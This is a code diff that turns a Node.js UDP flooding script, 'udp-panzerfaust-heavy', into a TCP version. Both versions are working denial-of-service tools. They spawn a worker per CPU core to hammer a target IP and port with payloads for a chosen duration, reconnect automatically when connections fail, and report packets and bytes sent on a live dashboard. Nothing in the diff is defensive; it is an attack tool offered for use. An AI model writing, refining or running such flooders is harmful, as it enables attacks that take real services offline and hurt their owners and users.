@@ -1,24 +1,22 @@
-const dgram = require('dgram');
+const net = require('net');
 const cluster = require('cluster');
 const os = require('os');
 
 const target = process.argv[2];
-const port = parseInt(process.argv[3]) || 53;
+const port = parseInt(process.argv[3]) || 80;
 const duration = parseInt(process.argv[4]);
 
 if (!target || isNaN(duration)) {
-  console.log('Usage: node udp-panzerfaust-heavy.js <target_ip> <port> <duration_seconds>');
+  console.log('Usage: node tcp-panzerfaust-heavy.js <target_ip> <port> <duration_seconds>');
   process.exit(1);
 }
 
-// ========== CONFIG ==========
-const payloadSize = 1472; // Max UDP payload (Ethernet MTU)
-const cpuCount = os.cpus().length;
-const payload = Buffer.alloc(payloadSize); // fast empty buffer
-
 const endTime = Date.now() + duration * 1000;
+const payloadSize = 1472;
+const payload = Buffer.alloc(payloadSize);
+const cpuCount = os.cpus().length;
 
-// ========== FORMATTING ==========
+// --- Format Helpers ---
 function formatNumber(n) {
   const units = ['', 'K', 'M', 'B', 'T'];
   let i = 0;
@@ -39,13 +37,12 @@ function formatBytes(bytes) {
   return `${bytes.toFixed(2)} ${units[i]}`;
 }
 
-// ========== MASTER ==========
 if (cluster.isMaster) {
   let totalSent = 0;
   let totalBytes = 0;
 
   console.clear();
-  console.log('UDP-PANZERFAUST [HEAVY]');
+  console.log('TCP-PANZERFAUST [HEAVY]');
   console.log('--------------------------------------');
   console.log(`Target:                ${target}:${port}`);
   console.log(`Duration:              ${duration}s`);
@@ -66,7 +63,7 @@ if (cluster.isMaster) {
 
   setInterval(() => {
     console.clear();
-    console.log('UDP-PANZERFAUST [HEAVY]');
+    console.log('TCP-PANZERFAUST [HEAVY]');
     console.log('--------------------------------------');
     console.log(`Total Packets Sent:    ${formatNumber(totalSent)}`);
     console.log(`Data Sent:             ${formatBytes(totalBytes)}`);
@@ -81,31 +78,34 @@ if (cluster.isMaster) {
     process.exit(0);
   }, duration * 1000);
 
-// ========== WORKER ==========
 } else {
-  const sock = dgram.createSocket('udp4');
-
-  sock.bind(() => {
-    sock.setSendBufferSize(4 * 1024 * 1024); // 4MB socket buffer
-  });
-
   let sent = 0;
   let bytes = 0;
 
-  function flood() {
-    function loop() {
-      if (Date.now() > endTime) return;
+  function connectAndFlood() {
+    const socket = net.createConnection({ host: target, port: port }, () => {
+      function sendLoop() {
+        if (Date.now() > endTime) return socket.destroy();
 
-      for (let i = 0; i < 100; i++) {
-        sock.send(payload, port, target);
-        sent++;
-        bytes += payloadSize;
+        for (let i = 0; i < 50; i++) {
+          socket.write(payload);
+          sent++;
+          bytes += payloadSize;
+        }
+
+        setImmediate(sendLoop);
       }
 
-      setImmediate(loop);
-    }
+      sendLoop();
+    });
 
-    loop();
+    socket.on('error', () => {
+      setTimeout(connectAndFlood, 100); // reconnect on error
+    });
+
+    socket.on('close', () => {
+      if (Date.now() < endTime) setTimeout(connectAndFlood, 100);
+    });
   }
 
   setInterval(() => {
@@ -114,5 +114,5 @@ if (cluster.isMaster) {
     bytes = 0;
   }, 1000);
 
-  flood();
+  connectAndFlood();
 }
